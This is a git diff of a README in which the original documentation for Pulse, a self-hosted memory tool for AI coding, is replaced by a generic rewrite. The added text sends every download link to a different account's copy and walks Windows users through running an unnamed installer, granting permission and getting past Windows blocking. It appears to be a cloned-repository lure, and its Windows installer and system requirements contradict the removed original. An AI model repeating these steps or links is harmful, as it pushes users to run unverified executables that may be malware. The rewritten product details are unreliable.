@@ -1,165 +1,255 @@
-<div align="center">
+# ⚡ pulse-ai - Keep AI Work History Clear
 
-# Pulse
+[![Download pulse-ai](https://img.shields.io/badge/Download%20pulse--ai-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kuldeepsuryawanshi56-del/pulse-ai)
 
-**Operational memory for AI coding.**
+## 🧭 What pulse-ai does
 
-Your codebase tells the *what*. Pulse remembers the *why*.
+pulse-ai helps you keep a clear record of your AI coding work. It saves the choices you made, the dead ends you hit, and the patterns you want to reuse later.
 
-[![CI](https://github.com/glieai/pulse-ai/actions/workflows/ci.yml/badge.svg)](https://github.com/glieai/pulse-ai/actions/workflows/ci.yml)
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![VS Code](https://img.shields.io/visual-studio-marketplace/v/glie.pulse-ai?label=VS%20Code)](https://marketplace.visualstudio.com/items?itemName=glie.pulse-ai)
-[![npm](https://img.shields.io/npm/v/@glie/pulse-mcp?label=MCP)](https://www.npmjs.com/package/@glie/pulse-mcp)
+It is built for people who use AI tools for coding and want a simple memory layer across sessions. You can keep it on your own system. You keep control of your data.
 
-[Install Extension](https://marketplace.visualstudio.com/items?itemName=glie.pulse-ai) · [Self-Host](#quick-start) · [Documentation](#how-it-works)
+## ✨ What you can do with it
 
-</div>
+- Save notes from each coding session
+- Keep track of decisions you made
+- Record failed tries so you do not repeat them
+- Spot patterns in how you solve problems
+- Search past work when you need context
+- Store data on your own machine or server
+- Use it with common developer tools
 
----
+## 📥 Download pulse-ai
 
-Pulse is a self-hosted knowledge base that fills itself. It watches your AI coding sessions, captures decisions, dead-ends, and patterns — then makes them searchable for you and your AI agents.
+Use this link to visit the page to download and set it up:
 
-**Why?** Every day, developers make dozens of important decisions during AI coding sessions. Why you chose this approach over that one. What you tried that didn't work. The business constraint that drove a technical choice. All of this disappears when the chat window closes. Pulse captures it automatically.
+[Visit the pulse-ai download page](https://github.com/kuldeepsuryawanshi56-del/pulse-ai)
 
-## Features
+If you are on Windows, open the page, find the latest release or setup files, then download and run the file for your system.
 
-- **Auto-capture** — Watcher monitors commits and AI sessions, generates structured insights via LLM
-- **MCP integration** — Claude Code and Codex query your knowledge base before making decisions
-- **Hybrid search** — Full-text + vector search with sub-10ms response times
-- **VS Code extension** — Sidebar with drafts, search, and CodeLens annotations
-- **CLI** — `pulse watch`, `pulse search`, `pulse reflect` — works without VS Code
-- **Privacy first** — Drafts stay local. Only published insights reach the server. Self-hosted = your data.
+## 🪟 Windows setup
 
-## Quick Start
+### 1) Download the file
+Open the download page above in your browser.
 
-### 1. Start the server
+Look for:
+- the latest release
+- a Windows file
+- an installer or app file
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/glieai/pulse-ai/main/docker-compose.yml -o docker-compose.yml
-docker compose up -d
-```
+Save the file to your Downloads folder.
 
-Pulse is running at `http://localhost:5173` — no login required in solo mode.
+### 2) Open the file
+After the download finishes:
 
-Optionally copy `.env.example` to `.env` to customize settings (default values work out of the box).
+- open File Explorer
+- go to Downloads
+- double-click the file you downloaded
+- if Windows asks for permission, choose the option to run it
 
-### 2. Connect your tools
+### 3) Follow the setup steps
+If the app shows a setup screen, follow the prompts on the screen.
 
-```bash
-npx @glie/pulse-cli init       # one-time setup: config + MCP registration
-npx @glie/pulse-cli setup-mcp  # run in each project folder to enable MCP there
-```
+You may see steps like:
+- choose a folder
+- allow the app to create local data
+- confirm the install
+- launch pulse-ai
 
-The `init` creates your config (`~/.pulse/config.json`) and registers the MCP server globally. Then run `setup-mcp` in each project folder where you want MCP available — or just run `pulse watch` which does both.
+### 4) Start the app
+After setup, open pulse-ai from:
+- the Start menu
+- a desktop shortcut
+- the folder where you installed it
 
-**Optional:** Install the [Pulse AI](https://marketplace.visualstudio.com/items?itemName=glie.pulse-ai) VS Code extension for a sidebar with drafts, search, watcher controls, and CodeLens annotations. The extension reads the config created by the CLI — no extra setup needed.
+## 🧠 How it works
 
-### 3. Code as usual
+pulse-ai acts like a private work log for AI coding.
 
-Open Claude Code or Codex in any configured project. Your AI agents query the knowledge base automatically via MCP. Run `pulse watch` to auto-generate insights from commits and AI sessions.
+When you work on a task, you can save:
+- what you tried
+- what worked
+- what failed
+- what you want to remember next time
 
-## How It Works
+This helps you build a useful history of your work instead of starting from zero each time.
 
-```
-You code with AI → Pulse watches → LLM generates insight → Draft saved locally
-                                                              ↓
-                                                    You review & publish
-                                                              ↓
-                                                    Searchable by you + AI agents
-```
+## 💻 What you need
 
-### Insight Kinds
+pulse-ai is made for modern Windows systems. A typical setup works best with:
 
-| Kind | What it captures |
-|------|-----------------|
-| `decision` | Technical choices with alternatives considered |
-| `dead_end` | Approaches that failed and why |
-| `pattern` | Reusable knowledge and conventions |
-| `context` | Background information |
-| `progress` | Milestones and deliverables |
-| `business` | Domain constraints that drove technical decisions |
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space for the app and local data
+- internet access for download and updates
 
-### Architecture
+For smoother use with larger work logs:
+- 8 GB RAM
+- extra disk space for notes and session data
 
-```
-/api        — Hono + Bun (TypeScript, sub-10ms)
-/web        — SvelteKit + Tailwind
-/cli        — CLI tool (Bun)
-/extension  — VS Code extension
-/mcp        — MCP server (Model Context Protocol)
-/shared     — Shared types and utils
-```
+## 🔧 Common ways people use it
 
-**Stack:** PostgreSQL 17 + pgvector (HNSW) · Hono · Bun · SvelteKit · Tailwind
+### Keep session notes
+Use pulse-ai after a coding session to store the key points you want to remember.
 
-## Configuration
+### Track decisions
+If you chose one fix over another, save the reason. That helps you avoid the same debate next time.
 
-Copy `.env.example` to `.env` and configure:
+### Save dead ends
+If a path did not work, keep that record. It can save time later.
 
-```bash
-cp .env.example .env
-```
+### Build a pattern library
+Over time, you can see how you solve tasks and reuse the same approach where it fits.
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `DATABASE_URL` | Yes | PostgreSQL connection string |
-| `JWT_SECRET` | Yes | Random 32+ character string |
-| `ANTHROPIC_API_KEY` | No | For AI-powered insight generation |
-| `OPENAI_API_KEY` | No | Alternative LLM provider |
+### Work with AI tools
+pulse-ai fits well with AI coding workflows, including tools that support local memory, notes, or context sharing.
 
-## Development
+## 🗂️ Good things to store
 
-```bash
-# Install dependencies
-bun install
+You can keep entries like:
 
-# Start database
-docker compose -f docker-compose.dev.yml up -d
+- bug name
+- goal of the task
+- steps you tried
+- fix that worked
+- files you changed
+- why you made the change
+- next step for later
 
-# Setup
-cp .env.example .env
+A simple format helps a lot. Keep each entry short and clear.
 
-# Run migrations
-bun run db:migrate
+## 🛠️ Basic first use
 
-# Start API (terminal 1)
-cd api && bun run dev
+### Step 1: Open the app
+Launch pulse-ai after install.
 
-# Start Web (terminal 2)
-cd web && bun run dev
-```
+### Step 2: Create your first entry
+Write one note for a real task you worked on.
 
-## MCP Tools
+### Step 3: Add context
+Include:
+- what you were trying to do
+- what AI suggested
+- what you tested
+- what you chose
 
-When connected via MCP, your AI agent has access to:
+### Step 4: Save and return later
+Come back when you start the same kind of task again.
 
-| Tool | Description |
-|------|-------------|
-| `pulse_search` | Search the knowledge base |
-| `pulse_context` | Get relevant context for a topic |
-| `pulse_file_context` | Get insights related to a file |
-| `pulse_create` | Record a new insight |
-| `pulse_publish` | Publish draft insights |
-| `pulse_summary` | Get knowledge base overview |
-| `pulse_generate` | Generate insight from raw data |
+### Step 5: Search before you repeat work
+Check old notes before you try the same fix again.
 
-## Contributing
+## 🔒 Self-hosted use
 
-Contributions are welcome. Please open an issue first to discuss what you'd like to change.
+pulse-ai is built for self-hosted use. That means you can run it on your own setup rather than putting your work data in a public service.
 
-```bash
-# Fork the repo, create a branch
-git checkout -b feature/your-feature
+This gives you:
+- more control over your notes
+- local storage of work history
+- a private place for coding decisions
+- the option to run it on a home or office machine
 
-# Make changes, run checks
-bun run lint
-bun run format
+## 🧰 Related tools
 
-# Open a PR
-```
+pulse-ai fits into a modern developer setup and connects well with tools in this space:
 
-## License
+- Claude Code
+- Codex
+- VS Code extensions
+- MCP-based tools
+- PostgreSQL-backed setups
+- TypeScript and Svelte apps
 
-Apache 2.0 — see [LICENSE](LICENSE).
+You do not need to know these tools to start. They help if you use pulse-ai in a larger workflow.
 
-Built by [Glie](https://glie.ai).
+## 📁 Example use case
+
+You are fixing a bug with AI help.
+
+You try three things:
+- update a config file
+- change one function
+- adjust a data query
+
+Only one works.
+
+With pulse-ai, you can save:
+- the bug name
+- each try
+- the working fix
+- the reason the other tries failed
+
+Next time you see the same issue, you can find the old note fast.
+
+## 🧭 Simple setup flow
+
+1. Open the download page
+2. Get the latest Windows file
+3. Run the installer or app file
+4. Open pulse-ai
+5. Add your first session note
+6. Use it after each coding task
+
+## 🖥️ If the app does not open
+
+Try these steps:
+
+- make sure the file finished downloading
+- run the file again
+- check that Windows did not block it
+- restart your computer
+- download the file again if it seems broken
+
+If you still cannot open it, look for the latest file on the download page and try that one
+
+## 📌 Best way to use pulse-ai every day
+
+Use it at the end of each AI coding session.
+
+Keep notes short:
+- task
+- what you tried
+- what worked
+- what to remember
+
+That habit makes your session history useful fast.
+
+## 📦 Download again when needed
+
+If you need the file again, use this link:
+
+[Download pulse-ai from GitHub](https://github.com/kuldeepsuryawanshi56-del/pulse-ai)
+
+## 🧩 Project focus
+
+pulse-ai is made for:
+- AI-assisted coding
+- work memory
+- note capture
+- problem history
+- self-hosted storage
+- open source use
+
+It gives you one place to keep the parts of your work that are easy to forget
+
+## 📘 Data you may want to keep
+
+A good entry can include:
+
+- date
+- project name
+- task name
+- AI tool used
+- key decision
+- result
+- follow-up needed
+
+This keeps your notes easy to scan later
+
+## 🧪 Helpful habits
+
+- write notes right after the task
+- keep one note per issue
+- use the same format each time
+- include the reason behind a choice
+- store failed tries as well as wins
+- search old notes before starting a similar task
